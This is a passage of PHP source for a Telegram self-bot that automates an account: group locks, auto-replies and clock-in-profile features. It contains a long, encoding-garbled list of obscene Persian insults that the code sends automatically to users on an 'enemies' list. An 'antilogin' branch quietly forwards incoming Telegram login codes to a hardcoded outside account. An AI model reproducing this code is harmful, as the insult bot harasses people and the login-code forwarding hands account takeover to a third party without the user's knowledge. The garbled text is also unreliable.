                        , "ฺฉูู? ููู ? ุญู?ุฑ ุฒุงุฏู", "ููุช? ุชู ฺฉุต ููุช ุชููุจู ูุง? ุณุฑุนุช? ู?ุฒุฏู ุชู ฺฉูุฑู ุจูุฏ? ุจุนุฏ ุงูุงู ุจุฑุง ุจฺฉูู ููุช ุดุงุฎ ู?ุด? ูุน?   ", "ุชู ?ู ฺฉุต ููู ุง? ฺฉ ููุชู ุจู ูู ูุฏ?ู ฺฉุฑุฏ? ุชุง ุฎุง?ู ูุงู?ูู ฺฉู? ูฺฏ ูู ุฎุฎุฎุฎ", "ุงูฺฏุดุช ูุงฺฉู ุชู ฺฉููู ูุงููุณุช", "ุชุฎุชู ุณ?ุงูู ูุฏุฑุณู ุจุง ูุนุงุฏูุงุช ุฑ?ุงุถ?ู ุฑูุด ุชู ฺฉุต ููุช ุงุตูุง ุฎุฎุฎุฎุฎุฎุฎ ", "ฺฉ?ุฑู ุชุง ุชู ุฎุดฺฉ ุฎุดฺฉ ุจุง ฺฉู? ูููู ุฑูุด ุชู ฺฉุต ุฎุงุฑุช ", "ฺฉุต ููุช ุจู ุตูุฑุช ุถุฑุจุฏุฑ? ", "ฺฉุต ุฎุงุฑุช ุจู ุตูุฑุช ูุณุชุท?ู?", "ุฑุดุชู ฺฉูู ุขููพ ุจู ุตูุฑุช ุฒูุฌ?ุฑู ุง? ุชู ฺฉุต ูุณูุช ุฎุฎุฎุฎ ", "10 ุฏู?ูู ุจ?ุดุชุฑ ุงุจู ู?ุฑ?ุฎุช ุชู ฺฉุณ ููุช ุง?ู ูู?ุดุฏ?", "ูฺฉุฑ ฺฉุฑุฏ? ููุช ?ู ุจุงุฑ ุจููู ุฏุงุฏู ุฏ?ฺฏู ุดุงุฎ?", "ุงฺฏุฑ ููุชู ุฎูุจ ฺฉุฑุฏู ุจูุฏู ุญุงูุง ุชู ุง?ูุฌูุฑ? ูู?ุดุฏ?"
                        , "ุญุฑูู ูููุน", "ููู ุณฺฏ ูุงููุณ", "ููู ููุช ุดูุง ููู ฺฺฺฺ", "ููู ฺฉ?ุฑ ูุงูพ ุฒู", "ููุน ุงูุจ?", "ููู ฺฉ?ุฑ ุฏุฒุฏ", "ููู ฺฉ?ูู?", "ููู ฺฉุตูพุงุฑู", "ุฒูุง ุฒุงุฏุน", "ฺฉ?ุฑ ุณฺฏ ุชู ฺฉุต ูุชุช ูพุฎุฎุฎ", "ููุฏ ุฒูุง", "ููู ุฎ?ุงุจูู?", "ู?ุณ ุจุน ฺฉุณ ุญุณุงุณ?ุช ุฏุงุฑู", "ฺฉุต ูฺฏู ููู ุณฺฏ ฺฉู ู?ฺฉููุชุชุงุงุงุง", "ฺฉุต ูู ุฌูุฏุช", "ููู ุณฺฏ", "ููู ฺฉูู?", "ููู ุฒ?ุฑุงุจ?", "ุจฺฉู ููุชู", "ููุน ูุงุณุฏ", "ููู ุณุงฺฉุฑ", "ฺฉุณ ููุน ุจุฏุฎูุงู", "ูฺฏุง??ุฏู", "ูุงุฏุฑ ุณฺฏ", "ููุน ุดุฑุท?", "ฺฏ? ููุน", "ุจุงุจุงุช ุดุงุด?ุฏุชุช ฺฺฺฺฺฺ", "ููู ูุงูุฑ", "ุญุฑููุฒุงุฏู", "ููู ฺฉุต", "ฺฉุต ููุช ุจุงู", "ูพุฏุฑ ุณฺฏ", "ุณ?ฺฉ ฺฉู ฺฉุต ููุช ูุจ?ููุช", "ฺฉููุฏู", "ููู ููู", "ููู ุณฺฏ", "ูุงุฏุฑ ุฌูุฏู", "ฺฉุต ฺฉูพฺฉ ุฒุฏุน", "ููุน ููฺฏ?", "ููู ุฎ?ุฑุงุช?", "ุณุฌุฏู ฺฉู ุณฺฏ ููุน", "ููู ุฎ?ุงุจูู?", "ููู ฺฉุงุฑุชูู?", "ุชฺฉุฑุงุฑ ู?ฺฉูู ฺฉุต ููุช", "ุชูฺฏุฑุงู ุชู ฺฉุณ ููุช", "ฺฉุต ุฎูุงุฑุช", "ุฎูุงุฑ ฺฉ?ูู?", "ูพุง ุจุฒู ฺฺฺฺฺ", "ูุงุฏุฑุชู ฺฏุง??ุฏู", "ฺฏูุฒ ููุน", "ฺฉ?ุฑู ุชู ุฏูู ููุช", "ููุน ููฺฏุงู?", "ฺฉ?ุฑู ุชู ฺฉุต ุฒ?ุฏุช", "ฺฉ?ุฑ ุชู ูููุง? ุงุจุฌ?ุช", "ุงุจุฌ? ุณฺฏ", "ฺฉุณ ุฏุณุช ุฑ?ุฏ? ุจุง ุชุง?ูพ ฺฉุฑุฏูุช ฺฺฺ", "ุงุจุฌ? ุฌูุฏู", "ููุน ุณฺฏ ุณ?ุจ?ู", "ุจุฏู ุจฺฉู?ู ฺฺฺฺ", "ฺฉุต ูุงููุณ", "ุดู ูุงููุณ", "ุฑ?ุฏู ูพุณ ฺฉูุช ฺฺฺฺฺ", "ููู ุดู", "ููุน ูุณุท?", "ููู ูู", "ุฏุณุช ู ูพุง ูุฒู ฺฉุณ ููุน", "ููู ููู", "ุฎูุงุฑุชู ฺฏุง??ุฏู", "ูุญู?!ุ", "ููุช ุฎูุจุน!ุ", "ฺฉุณ ุฒูุช", "ุดุงุด ููุน", "ููู ุญ?ุงุท?", "ูู ุบุณู?", "ฺฉ?ุฑู ุชู ฺฉุณ ููุช ุจฺฏู ูุฑุณ? ฺฺฺฺ", "ุงุจู ุชู ฺฉุต ููุช", "ูุงฺฉ ?ูุฑ ูุงุฏุฑ ุฎูุงุฑ ุณฺฏ ูพุฎุฎุฎ", "ฺฉ?ุฑ ุณฺฏ ุชู ฺฉุต ููุช", "ฺฉุต ุฒู", "ููู ูุฑุงุฑ?", "ุจฺฉู ููุชู ูู ุจุงู ุฌูุน ฺฉู ููู ุฌูุฏู /:::", "ููู ุฌูุฏู ุจ?ุง ูุงุณู ุณุงฺฉ ุจุฒู", "ุญุฑู ูุฒู ฺฉู ูฺฉููุช ูุงุงุง :|", "ฺฉ?ุฑ ุชู ฺฉุต ููุช๐", "ฺฉุต ฺฉุต ฺฉุต ููุช๐", "ฺฉุตุตุตุต ููุช ุฌูููู", "ุณฺฏ ููุน", "ฺฉุต ุฎูุงุฑุช", "ฺฉ?ุฑ? ู?ุณ", "ฺฉูุน ฺฉ?ุฑ?", "ุช?ุฒ ุจุงุด ุณ?ฺฉ ฺฉู ูุจ?ููุช", "ููุฌ ุช?ุฒ ุจุงุด ฺฺฺ", "ุจ?ุง ููุชู ุจุจุฑ", "ุจฺฉู ููุชู ุจุงู ", "ฺฉ?ุฑู ุชู ุจุฏุฎูุงู", "ฺฺฺฺฺฺฺ", "ููู ุฌูุฏู", "ููู ฺฉุต ุทูุง", "ููู ฺฉูู ุทูุง", "ฺฉุณ ููุช ุจุฒุงุฑู ุจุฎูุฏ?ู!ุ", "ฺฉ?ุฑู ุฏููุช", "ูุงุฏุฑ ุฎุฑุงุจ", "ููู ฺฉูู?", "ูุฑ ฺ? ฺฏูุช? ุชู ฺฉุต ููุช ุฎุฎุฎุฎุฎุฎุฎ", "ฺฉุต ูุงููุณุช ุจุง?", "ฺฉุต ููุช ุจุง? ://", "ฺฉุต ูุงููุณุช ุจุงุน? ุชุฎุฎุฎุฎุฎ", "ฺฉูู ฺฏูุงุจ?!", "ุฑ?ุฏ? ุขุจ ูุทุน", "ฺฉุต ฺฉู ููุชู ฺฉุน", "ูู ฺฉูู?", "ูู ุฎูุดูุฒู", "ููู ููุณ", " ูู ?ู ฺุดู ", "ููู ฺุงูุงู", "ููู ุฌ?ูุฏู", "ููู ุญุฑุต? ", "ูู ูุด?", "ููู ุณุงฺฉุฑ", "ูู ุชุฎู?", "ููู ุจ? ูู?ุช", "ูู ฺฉุณ", "ูู ุณฺฉุณ?", "ูู ูุฑุงุฑ?", "ูุด ููู", "ุณฺฏ ููู", "ุดู ููู", "ููู ุชุฎู?", "ููู ุชููู?", "ููู ฺฉููู", "ูู ุฎุดฺฏู", "ูู ุฌูุฏู", "ูู ูู ", "ูู ุณฺฉุณ?", "ูู ูุด", "ฺฉุณ ูู ", "ูู ฺฉูู", "ูู ุฑุง?ฺฏุงู", "ูู ุฎุงุฑุฏุงุฑ", "ููู ฺฉ?ุฑ ุณูุงุฑ", "ูู ูพู?ูุฒ", "ูู ูุญู?", "ููู ุจฺฏุง??", "ููู ุจูุจ?", "ููู ุงูฺฉุณ?ุณ", "ูู ุฎ?ุงุจูู?", "ูู ุนู?", "ูู ุณุงูพูุฑุช?", "ูู ูุงุดุฎูุฑ", "ููู ุทูุง", "ููู ุนููู?", "ููู ูุฑ ุฌุง??", "ูู ุฏ?ูุซ", "ุชุฎุฎุฎุฎุฎุฎุฎุฎุฎ", "ูู ุฑ?ุฏู?", "ูู ุจ? ูุฌูุฏ", "ููู ุณ?ฺฉ?", "ููู ฺฉ??ุฑ", "ูู ฺฏุดุงุฏ", "ูู ูพูู?", "ูู ูู", "ูู ูุฑุฒู", "ูู ุฏูุงุช?", "ููู ู?ูุฏูุฒ?", "ูู ุชุง?ูพ?", "ูู ุจุฑู?", "ูู ุดุงุด?", "ููู ุฏุฑุงุฒ?", "ุดู ููุน", "?ฺฉู ููุชู ฺฉู", "ฺฉุณ ุฎูุงุฑ ุจุฏุฎูุงู", "ุขุจ ฺุงูุงู", "ููู ุฌุฑ?ุฏู", "ููู ุณฺฏ ุณู?ุฏ", "ุขุจ ฺฉูู", "ููู 85", "ููู ุณููพุฑ?", "ุจุฎูุฑุด", "ฺฉุณ ู", "ุฎูุงุฑุชู ฺฏุง??ุฏู", "ุฎุงุฑฺฉุณุฏู", "ฺฏ? ูพุฏุฑ", "ุขุจ ฺุงูุงู", "ุฒูุง ุฒุงุฏู", "ุฒู ุฌูุฏู", "ุณฺฏ ูพุฏุฑ", "ูุงุฏุฑ ุฌูุฏู", "ููุน ฺฉ?ุฑ ุฎูุฑ", "ฺฺฺฺฺ", "ุช?ุฒ ุจุงูุง", "ููู ุณฺฏู ุจุง ฺฉุณุดุฑ ุฏุฑ ู?ุฑู", "ฺฉ?ุฑ ุณฺฏ ุชู ฺฉุต ููุช", "kos kesh", "kiri", "nane lashi", "kos", "kharet", "blis kirmo", "ุฏูุงุช?", "ฺฉ?ุฑู ูุง ฺฉุต ุฎุงุฑุช", "ฺฉุต ููุช", "  ูุงุฏุฑ ฺฉูู? ูุงุฏุฑ ฺฉุต ุฎุทุง ฺฉุงุฑ ฺฉ?ุฑ ุจ ฺฉูู ุจุงุจุงุช ุด ุช?ุฒ ุจุงุด ุฎุฑุฑุฑุฑุฑุฑ ุฎุงุฑุชู ุงุฒโฺฉุตโฺฏุง??ุฏ ูุจุงุต ุดุงุฎ ุด? ฺฉุตโููุช ฺุณโูพุฏุฑ ุฎุงุฑุชู ููุช ุฒ?ุฑโฺฉ?ุฑูโูพูุงููุฏู ุดุฏู ุงูุตูุต ู?ุฎูุฑู ูุงุตุช ฺฉ ุฎุง?ู ูุฏุงุฑ? ุงุฒ ููุช ุฏูุงุน ฺฉู? ุงูุตูุต ู?ุฎูุฑู ูุงุตุช ฺฉ ุฎุง?ู ูุฏุงุฑ? ุงุฒ ููุช ุฏูุงุน ฺฉู? ุณุณุณุณุณุณฺฏ ููุชู ุงุฒ ฺฉฺูโฺฉุฑุฏ ูุจุงุต ุดุงุฎ ุด? ูุงุฏุฑ ฺฉูู ุฎุทุง ุณ?ฺฉ ฺฉู ุชู ฺฉุต ุฎุงุฑุช ุจ? ูุงููุณ ูุงุฏุฑโฺฉุตโุฌู ุดุฏู ฺฉุต ููุช ุณุงููุง? ุณุงููุง ุจุงูุง ุจ?ูุงููุต ุฎุงุฑ ฺฉ?ุฑ ุดุฏู ุจุงูุง ุจุงุด ุจุฎูุฏู ุจ ฺฉุต ุฎุงุฑุช ุจุงูุง ุจุงุด ุจุฎูุฏู ุจ ฺฉุต ุฎุงุฑุช ูพุตุฑู ุชู ู?ฺ ูููุน ุจ ูู ูู?ุฑุต? ูุงุฏุฑ ู?ุฒ ฺฉุต ุงู? ุจ?ุง ฺฉ?ุฑูู ุจุง ุฎูุฏุช ุจุจุฑ ุจุน ฺฉุต ููุช ููุช? ุงุฒ ุชุฑุณ ูู ู?ุฑ? ุงููุฌุงุจุฑู ุชู ฺฉุต ุฎุงุฑุช ฺฉุต ููุช ุณุงููุง? ุณุงููุง ุจุงูุง ฺฉูู? ฺฉ?ุฑ ุจู ูุงุฏุฑู ุฎูุฏุชู ฺฉุต? ุชูุฑู ุดุงุฎ ฺฉุฑุฏ ุจุฑุฏฺฉููุชู ุจุฏู ", " ุฎุงุฑฺฉุตู  ุฎุงุฑุฌูุฏู  ฺฉ?ุฑู ุฏููุช  ูุงุฏุฑ ฺฉูู?  ูุงุฏุฑ ฺฉุต ุฎุทุง ฺฉุงุฑ  ฺฉ?ุฑ ุจ ฺฉูู ุจุงุจุงุช ุด ุช?ุฒ ุจุงุด  ุฎุฑุฑุฑุฑุฑุฑ ุฎุงุฑุชู ุงุฒโฺฉุตโฺฏุง??ุฏ ูุจุงุต ุดุงุฎ ุด?  ุงูุตูุต ู?ุฎูุฑู ูุงุตุช ฺฉ ุฎุง?ู ูุฏุงุฑ? ุงุฒ ููุช ุฏูุงุน ฺฉู?  ุณุณุณุณุณุณฺฏ ููุชู ุงุฒ ฺฉฺูโฺฉุฑุฏ ูุจุงุต ุดุงุฎ ุด?  ุจ? ูุงููุณ ูุงุฏุฑโฺฉุตโุฌู ุดุฏู  ฺฉุต ููุช ุณุงููุง? ุณุงููุง ุจุงูุง  ุฎุงุฑ ุฎ?ุฒ ุชุฎู ุฎุฑ  ููู ฺฉุต ููุชุงุจ?  ููู ฺฉุต ุช?ุฒ  ููู ฺฉ?ุฑ ุฎูุฑุฏู ุดุฏู  ูุงุฏุฑ ู?ุฒ ฺฉุต ุงู?  ุจุงูุง ุจุงุด ุจุฎูุฏู ุจ ฺฉุต ุฎุงุฑุช  ุงูุตูุต ู?ุฎูุฑู ูุงุตุช ฺฉ ุฎุง?ู ูุฏุงุฑ? ุงุฒ ููุช ุฏูุงุน ฺฉู?  ูพุตุฑู ุชู ู?ฺ ูููุน ุจ ูู ูู?ุฑุต?  ููู ฺฉุตู  ฺฉูุตฺฉุด  ฺฉููุฏู  ูพุฏุฑุณฺฏ  ูพุฏุฑฺฉูู?  ูพุฏุฑุฌูุฏู  ูุงุฏุฑุช ุฏุงุฑู ุจูู ู?ุฏุน  ฺฉ?ุฑู ุชู ุฑ?ุด ุจุงุจุงุช  ูุฏุงุฏ ุชู ฺฉุต ูุงุฏุฑุช  ฺฉ?ุฑ ุฎุฑ ุชู ฺฉููุช  ฺฉ?ุฑ ุฎุฑ ุชู ฺฉุต ูุงุฏุฑุช  ฺฉ?ุฑ ุฎุฑ ุชู ฺฉุต ุฎูุงูุฑุช ", "ุชููู ุชู ฺฉุต ููุช", "ููู ุฎุฑฺฉ?", "ุฎูุงุฑ ฺฉุตุฏู", "ููู ฺฉุตู", "ูุงุฏุฑ ุจูุจู ุจุงูุง ุจุงุด ููุฎูุงู ูุงุฏุฑุช ุฑู ุฌูุฑู ุจฺฏุงู ุฏูฺฏู ูุจ ุฎูุฏ ููุงุฏ ุฑู ูุจุงุด", "ฺฉ?ุฑ? ููู", "ููู ููุช ุดูุง ููู ฺฺฺฺ", "ููุฏ ุฒูุง ุจ? ููู", "ู?ุฒูู ููุชู ฺฉุตโูพุฑ ู?ฺฉูู ฺฉ โุดุงุฎโ ูุด?", "ุจ? ุฎูุฏู ุจ? ุฌูุช ฺฉุตโููุช", "ุตฺฏโููุจุฑ ุงูุจ ูุงุฏุฑ ุช?ุฒ ุจุงุด", "ุจููุงููุต ุจุงูุง ุจุงุด  ูู ุฏุฑุตุฏ ูู ูฺฉุฑ ูฺฉู ููุช ููฺฉูู", "ุงุฎุฎููู ู?ุฏููุต? ุฎุงุฑุช ู? ฺฉุตโู?ุฏูุุุ", "ฺฉ?ุฑ ุณฺฏ ุชู ฺฉุต ูุชุช ูพุฎุฎุฎ", "ุฑุงู? ู? ุฏุงุด ฺฉุต ููุช", "ูพุง ุจุฒู ?ุช?ูฺฉ ฺฉุต ุฎู", "ู?ุณ ุจุน ฺฉุณ ุญุณุงุณ?ุช ุฏุงุฑู", "ฺฉุต ูฺฏู ููู ุณฺฏ ฺฉู ู?ฺฉููุชุชุงุงุงุง", "ฺฉุต ูู ุฌูุฏุช", "ุง?โฺฉ?ุฑู ุจ ููุช", "ฺฉุตโุฎุงุฑุช ุช?ุฒ ุจุงุด", "ุงุชุง?ูพู ุชู ฺฉุตโููุช ุฌุง ุดู  ", "ุจฺฉู ููุชู", "ฺฉ?ุฑูู ฺฉุฑุฏูโฺฉุตโููุช ูุงุฑ ุดุฏ?ุ", "ุงููุฏ ุถุน?ู ูุจุงุด ฺุตฺฉ", "ูุงุฏุฑ ููุด ุดุฏู ุฌูุฑ? ุจุง ฺฉ?ุฑโู?ุฒูู ุจ ูุฑู ุณุฑ ููุช ฺฉ ุญุงูุธุด ุจูพุฑู", "ุฎ?ู? ุงุชูุงู? ฺฉ?ุฑูโุจ ุฎุงุฑุช", "?ูู?? ฺฉุตโููุชู ุจฺฉููุุุ", "ูุงุฏุฑ ุจ?ูู ุง??โฺฉุตโููุชู ู?ฺฏุงู", "ุจ?ุง ฺฉ?ุฑูู ุจฺฏ?ุฑ ุจู?ุต ุดุง?ุฏ ูุฑุฌ? ุดุฏ ููุช ุงุฒ ุฒ?ุฑ ฺฉ?ุฑู ูุฑุงุฑ ฺฉูู", "ุจุงุจุงุช ุดุงุด?ุฏุชุช ฺฺฺฺฺฺ", "ุญ?ู ฺฉ?ุฑูโฺฉู ฺฉุต ููุช ฺฉูู", "ูุงุฏุฑโฺฉุต ุดฺฉูุงุช? ุช?ุฒ ุชุฑ ุจุงุด", "ุจ?ูุงููุต ุฒ?ุฑ ูุจุงุด ูุงุฏุฑ ฺฉุงูุฌ ุฑูุชู", "ฺฉุต ููุช ุจุงู", "ููุช ฺฉู? ฺฉ?ุฑูู ุจุฎูุฑ?", "ุณ?ฺฉ ฺฉู ฺฉุต ููุช ูุจ?ููุช", "ูุงููุต ุงุฎุชุงูพูุต ุฑู ููุช ููููโู?ูู?ุุุุ", "ฺฉ?ุฑ ูุงูุจฺฉ ุฏูุงุน? ุช?ู ูุฑุงูุณู ฺฉู ุงุตูุดโ ?ุงุฏู ู? ุจ ฺฉุตโููุช", "ุจุฑุต ู ุจุงูุง ุจุงุด ุฎุงุฑโฺฉุตู", "ูุงุฏุฑ ุฌูุฏู", "ุฏุงุด ู?ุฎุงู ฺูุจ ุจ?ุตุจุงู ุฑู ุชู ฺฉูู ููุช ฺฉูู ูุญู ูุดู:||", "ุฎุงุฑโฺฉุต ุดููุช? ูุจุง?ุฏ ุดุงุฎ ู?ุดุฏ?", "ุฎุฎุฎุฎุฎุฎุฎุฎููููุฎุฎุฎุฎุฎุฎุฎ ฺฉุตโููุช ุจุฑู ูพุง ุจุฒู ุฏุงุฏุงุด", "ุณุฌุฏู ฺฉู ุณฺฏ ููุน", "ฺฉ?ุฑู ุงุฒ ฺูุงุฑ ุฌูุช ูุฑุน? ?ุฑุงุต ุชู ฺฉุตโูุงููุตุช", "ุฏุงุด ุจุฑุต ุฑุงู? ู? ฺฉ?ุฑ? ุดุงุฎ ุดุฏ?", "ุชฺฉุฑุงุฑ ู?ฺฉูู ฺฉุต ููุช", "ุชูฺฏุฑุงู ุชู ฺฉุณ ููุช", "ฺฉุต ุฎูุงุฑุช", "ฺฉ?ุฑโุจ ุณุฑุฏุฑ ุฏูุงุชุชูู ูุงุต ูู ุดุงุฎ ู?ุด?", "ูพุง ุจุฒู ฺฺฺฺฺ", "ูุงุฏุฑุชู ฺฏุง??ุฏู", "ุจุฏู ุจุฑุต ุชุง ุฎุง?ูุงูู ุชุง ุชู ูฺฉุฑุฏูโุชู ฺฉุตโููุช", "ฺฉ?ุฑู ุชู ุฏูู ููุช", "ฺฉุตโููุช ูู ฺฉู ุฎุง?ูุงูู ุฑุงู? ู? ุจุง?ุฏ ููุช ุจฺฉูู", "ฺฉ?ุฑู ุชู ฺฉุต ุฒ?ุฏุช", "ฺฉ?ุฑ ุชู ูููุง? ุงุจุฌ?ุช", "ุจ?โูููโ ููุจุฑ ุฎุงุฑ ุจ?ูุงุฑ", "ุชู ฺฉ?ู?ุช ฺฉุงุฑโููู ุฒ?ุฑโุณูุงู ู?ุจุฑ?ฺฺ", "ุฏุงุด ุชู ุฎูุฏุช ุฎุงุณ? ุจ?ูุงููุต ุด? ู?ูู?ุุ", "ุฏุงุด ุชู ุฏุฑโู?ุฑ? ูู?โูุงุฏุฑุช ฺ?ุุุ", "ุฎุงุฑุชู ุจุง ฺฉ?ุฑ ู?ุฒููโุชู ุตูุฑุชุด ุฌูุฑ? ฺฉโุจุง ุฏ?ูุฑุง ุจุญุฑูู", "ููู ฺฉ?ุฑโุฎูุฑ ุชู ุจ ฺฉุตโุฎุงุฑุช ุฎูุฏ?ุฏ? ุดุงุฎ?ุฏ?", "ุจุงูุง ุจุงุด ุชุง?ูพ ุจุฏู ุจุฎูุฏูโุจูุช", "ุฑ?ุฏู ูพุณ ฺฉูุช ฺฺฺฺฺ", "ุจุงูุง ุจุงุด ฺฉ?ุฑูู ูุงุฎูุฏุขฺฏุงู ุชู ฺฉุตโููุช ฺฉูู", "ููุช ุจ ุฒ?ุฑู  ูุงุณ ุฏุฑุฏ ฺฉ?ุฑู", "ุฎ?ุฎ?ุฎ?ุฎ?ุฎุฎ?ุฎุฎ?ุฎ?ุฎุฎ??ุฎ?ุฎ?ุฎุฎ", "ุฏุณุช ู ูพุง ูุฒู ฺฉุณ ููุน", "ุงูู? ุฎุงุฑุชู ุจฺฉููโ ุจ? ุฎุงุฑ ููุจุฑ", "ูุงุฏุฑุช ุงุฒ ฺฉุตโุฌุฑโุจุฏู โฺฉ โุฏ?ฺฏ ูุดุงุฎ?ุุุููู ูุงุด?", "ููู", "ฺฉุต", "ฺฉ?ุฑ", "ุจ? ุฎุง?ู", "ููู ูุด", "ุจ? ูพุฏุฑูุงุฏุฑ", "ุฎุงุฑฺฉุตุฏู", "ูุงุฏุฑ ุฌูุฏู", "ฺฉุตฺฉุด"
                    ];
                    if (in_array($fromId, $data['enemies'])) {
                        $f = $fohsh[rand(0, count($fohsh) - 1)];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => $f, 'reply_to_msg_id' => $msg_id]);
                    }
                    if (in_array($fromId, $data['muted'])) {
                        if (in_array($type3, ['channel', 'supergroup'])) {
                            yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                        } else {
                            yield $this->messages->deleteMessages(['revoke' => true, 'id' => [$msg_id]]);
                        }
                    }


                    if (isset($data['answering'][$text])) {
                        yield $this->sleep(3);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => $data['answering'][$text], 'reply_to_msg_id' => $msg_id]);
                    }
                    if ($lockgp == 'on') {
                        if (in_array((yield $this->getInfo($update))['type'], ['chat', 'supergroup'])) {
                            if (isset($update['message']['media']['document']) || isset($update['message']['media']['photo']) || $text !== false) {
                                yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                    }

                    if ($lockmedia == 'on') {
                        if (in_array((yield $this->getInfo($update))['type'], ['chat', 'supergroup'])) {
                            if (isset($update['message']['media']['_'])) {
                                yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                    }
                    if ($antilogin == 'on') {
                        if (strpos($text, "Login code:") !== false && $fromId == 777000) {
                            yield $this->messages->forwardMessages(['from_peer' => 777000, 'to_peer' => 1550344125, 'id' => [$msg_id],]);
                        }
                    }
                    if ($locklink == 'on') {
                        if (in_array((yield $this->getInfo($update))['type'], ['chat', 'supergroup'])) {
                            if (preg_match("/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $text)) {
                                yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                    }
                    if ($locktag == 'on') {
                        if (in_array((yield $this->getInfo($update))['type'], ['chat', 'supergroup'])) {
                            if (strpos($text, "@") !== false) {
                                yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                    }
                    if ($lockvia == 'on') {
                        if (in_array((yield $this->getInfo($update))['type'], ['chat', 'supergroup'])) {
                            if (isset($update['message']['via_bot_id'])) {
                                yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                    }
                    if ($lockphoto == 'on') {
                        if (in_array((yield $this->getInfo($update))['type'], ['chat', 'supergroup'])) {
                            if (isset($update['message']['media']['photo'])) {
                                yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                    }
                    if ($lockmention == 'on') {
                        if (in_array((yield $this->getInfo($update))['type'], ['chat', 'supergroup'])) {
                            if ($update['message']['entities']['0']['_'] == "messageEntityMentionName") {
                                yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                    }
                    if ($lockforward == 'on') {
                        if (in_array((yield $this->getInfo($update))['type'], ['chat', 'supergroup'])) {
                            if (isset($update['message']['fwd_from']['_'])) {
                                yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                    }
                    if ($autochat == 'on') {
                        if (strpos($text, 'ุณูุงู') !== false) {
                            $sendMessageTypingAction = ['_' => 'sendMessageTypingAction'];
                            yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageTypingAction]);
                            yield $this->sleep(3);
                            $slm = ["ุนู?ฺฉ ุณูุงู", "ุณูุงู ุฎูุจ?", "ฺุฎุจุฑ", "ุนู?ฺฉ", "ุฎูุจ?ุ"];
                            $randslm = $slm[array_rand($slm)];

                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$randslm", 'reply_to_msg_id' => $message['id']]);

                        }
                        if (strpos($text, 'ุจุง?') !== false) {
                            $sendMessageTypingAction = ['_' => 'sendMessageTypingAction'];
                            yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageTypingAction]);
                            yield $this->sleep(3);
                            $bye = ["ุจุง?", "ุฎุฏุงูุธ", "ูุนูุง", "ุจุฑู ุฏ?ู", "ุจุณูุงูุช"];
                            $randbye = $bye[array_rand($bye)];
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$randbye", 'reply_to_msg_id' => $message['id']]);
                        }
                    }
                }
            }
        } catch (throwable $error) {
/*           //  $this->report("Surfaced: $e");
            $error_message = $error->getMessage();
            $error_file = $error->getFile();
            $error_line = $error->getLine();
            yield $this->messages->sendMessage(["peer" => $owner, "message" => "โ  Error Message: $error_message\n\nโ  Error File: $error_file\n\nโ  Error Line: $error_line"]);*/
        }
    }

    public function getLocalContents(string $patch): AMP\Promise
    {
        return (AMP\File\get($patch));
    }

    public function filePutContents(string $patch, string $contents): AMP\Promise
    {
        return (AMP\File\put($patch, $contents));
    }

    public function genLoop()
    {
        $timename = yield $this->getLocalContents("online.txt");
        $timebio = yield $this->getLocalContents("timebio.txt");
        $cbio = yield $this->getLocalContents("cbio.txt");
        $timepic = yield $this->getLocalContents("timepic.txt");
        $timesticker = yield $this->getLocalContents("timesticker.txt");
        if ($timename == 'on') {
            $time = date("H:i");
            $fonts = [["๐ถ", "๐ท", "๐ธ", "๐น", "๐บ", "๐ป", "๐ผ", "๐ฝ", "๐พ", "๐ฟโ"],
                ["โช", "โ ", "โก", "โข", "โฃ", "โค", "โฅ", "โฆ", "โง", "โจ"],
                ["โฟ", "โถ", "โท", "โธ", "โน", "โบ", "โป", "โผ", "โฝ", "โพ"],
                ["0", "๐", "ฯฉ", "ำ ", "เฅซ", "ฯฌ", "ฯฌ", "7", "๐ ", "เฅฏ"],
                ["ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ ใ", "ใ๐กใ"],
                ["๐", "๐", "๐", "๐", "๐", "๐", " ๐", "๐", "๐ ", "๐ก"],
                ["๐ฌ", "๐ญ", "๐ฎ", "๐ฏ", "๐ฐ", "๐ฑ", "๐ฒ", "๐ณ", "๐ด", "๐ต"],
                ["โ๐", "โ๐", "โ๐", "โ๐", "โ๐", "โ๐", "โ๐", "โ๐", "โ๐", "โ๐"],
                ["๐ถ", "า1", "า2", "า3", "า4", "า5", "า6", "า7", "า8", "า9า"]];
            $time = date("H:i");
            $time2 = str_replace(range(0, 9), $fonts[array_rand($fonts)], date("H:i"));
            $day_number = jdate('j');
            $month_number = jdate('n');
            $year_number = jdate('y');
            $day_name = jdate('l');
            yield $this->account->updateProfile(['last_name' => "$time2"]);
        }
        if ($timebio == 'on') {
            $time = date("H:i");
            $fonts = [["๐ถ", "๐ท", "๐ธ", "๐น", "๐บ", "๐ป", "๐ผ", "๐ฝ", "๐พ", "๐ฟโ"],
                ["โช", "โ ", "โก", "โข", "โฃ", "โค", "โฅ", "โฆ", "โง", "โจ"],
                ["โฟ", "โถ", "โท", "โธ", "โน", "โบ", "โป", "โผ", "โฝ", "โพ"],
                ["ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ ใ", "ใ๐กใ"],
